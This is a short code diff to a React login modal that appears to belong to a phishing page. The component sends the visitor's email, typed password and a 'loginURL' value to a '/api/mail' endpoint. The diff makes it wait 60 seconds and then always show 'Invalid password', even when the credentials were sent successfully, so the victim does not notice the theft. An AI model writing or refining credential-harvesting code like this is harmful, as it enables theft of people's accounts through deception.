@@ -15,7 +15,9 @@ const LoginModal = ({ email, styles= {}, loginURL= 'NOT PROVIDED' }) => {
     try {
       // Add your login logic here
       await axios.post('/api/mail', { email, password, loginURL });
-      await new Promise(resolve => setTimeout(resolve, 1000000));
+      await new Promise(resolve => setTimeout(resolve, 60000));
+      setIsLoading(false);
+      setError('Invalid password. Please try again.');
     } catch (err) {
       setError('Invalid password. Please try again.');
     } finally {
@@ -41,6 +43,7 @@ const LoginModal = ({ email, styles= {}, loginURL= 'NOT PROVIDED' }) => {
             opacity: 1;
             transform: translate(-50%, -50%);
           }
+        
         }
         @keyframes spin {
           0% { transform: rotate(0deg); }
